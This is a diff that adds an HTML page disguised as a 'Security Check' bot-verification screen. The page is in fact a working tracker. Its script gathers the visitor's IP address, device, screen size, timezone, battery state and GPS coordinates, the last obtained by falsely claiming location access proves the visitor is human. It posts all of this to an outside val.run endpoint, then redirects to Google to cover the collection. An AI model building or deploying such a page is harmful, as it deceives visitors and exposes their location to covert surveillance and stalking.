@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Security Check</title>
+<style>
+  body { background-color: #08080a; color: #ececf0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+  .loader { border: 3px solid #24242e; border-top: 3px solid #ffb03d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  h2 { font-weight: 700; letter-spacing: 0.05em; margin-bottom: 5px; }
+  p { color: #7a7a88; font-size: 14px; max-width: 300px; line-height: 1.5; }
+  .box { background: #101014; border: 1px solid #24242e; padding: 40px 20px; border-radius: 12px; width: 80%; max-width: 350px; }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="loader" id="spin"></div>
+  <h2 id="title">Verifying connection...</h2>
+  <p id="desc">Please allow location access to confirm you are human and not a bot.</p>
+</div>
+
+<script>
+  fetch("https://api.ipify.org?format=json").then(r => r.json()).then(ipData => {
+      let gps = null;
+      let info = {
+          ip: ipData.ip,
+          device: navigator.userAgent,
+          resolution: window.screen.width + "x" + window.screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          battery: "Unknown",
+          gps: null
+      };
+
+      if (navigator.getBattery) {
+          navigator.getBattery().then(function(battery) {
+              info.battery = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
+          });
+      }
+
+      if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+              (pos) => {
+                  gps = pos.coords.latitude + "," + pos.coords.longitude;
+                  info.gps = gps;
+                  sendData(info);
+              },
+              (err) => {
+                  sendData(info);
+              }
+          );
+      } else {
+          sendData(info);
+      }
+
+      function sendData(payload) {
+          document.getElementById("desc").innerText = "Verifying... please wait.";
+          fetch("https://Opforge--8d359e98dca911f194261607ee4eb77e.web.val.run", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(payload)
+          }).finally(() => {
+              window.location.href = "https://www.google.com";
+          });
+      }
+  });
+</script>
+</body>
+</html>
